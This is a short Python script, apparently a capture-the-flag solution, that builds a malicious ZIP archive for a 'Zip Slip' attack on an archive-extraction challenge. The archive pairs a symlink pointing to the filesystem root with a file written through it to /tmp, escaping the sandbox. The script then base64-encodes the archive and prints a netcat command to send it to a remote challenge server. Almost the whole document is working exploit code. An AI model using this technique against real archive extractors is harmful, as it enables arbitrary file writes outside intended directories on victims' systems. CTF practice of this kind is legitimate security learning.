#!/usr/bin/env python3
"""
create_exploit.py - Creates Zip Slip exploit for Ouroboros Archive

This script creates a malicious ZIP file containing:
1. A symlink "escape" pointing to "/" (root)
2. A file "escape/tmp/pwned" (which writes to /tmp/pwned outside sandbox)
"""

import zipfile
import struct
import os
import base64

def create_exploit_zip():
    """Create exploit ZIP with symlink"""
    
    print("[*] Creating exploit ZIP...")
    
    with zipfile.ZipFile('exploit.zip', 'w') as zf:
        # Create symlink entry
        # ZIP external_attr for symlink: 0xA0000000 (symlink flag)
        # Plus permissions: 0x1FF (777)
        info = zipfile.ZipInfo('escape')
        info.create_system = 3  # Unix
        info.external_attr = (0xA << 28) | (0o777 << 16)  # Symlink + perms
        
        # Symlink target is "/"
        zf.writestr(info, '/')
        print("[+] Added symlink: escape -> /")
        
        # Add payload file using the symlink path
        # This will be extracted to sandbox/escape/tmp/pwned
        # Which resolves to /tmp/pwned (outside sandbox!)
        zf.writestr('escape/tmp/pwned', 'EXPLOITED')
        print("[+] Added payload: escape/tmp/pwned")
    
    print("[+] Created exploit.zip")
    
    # Also create base64 version for netcat
    with open('exploit.zip', 'rb') as f:
        data = f.read()
        b64 = base64.b64encode(data).decode()
    
    with open('exploit.b64', 'w') as f:
        f.write(b64)
    
    print("[+] Created exploit.b64 (for netcat)")
    print(f"[*] ZIP size: {len(data)} bytes")
    print(f"[*] Base64 size: {len(b64)} bytes")
    
    return 'exploit.zip'

def test_locally():
    """Test the exploit locally"""
    print("\n[*] Testing locally...")
    print("[*] Run: ./dist/unzipper exploit.zip")
    print("[*] Expected: Flag should be printed if exploit works")

if __name__ == '__main__':
    create_exploit_zip()
    test_locally()
    
    print("\n[*] To test on remote server:")
    print("    nc challenge.l3mon.com 1337 < exploit.b64")
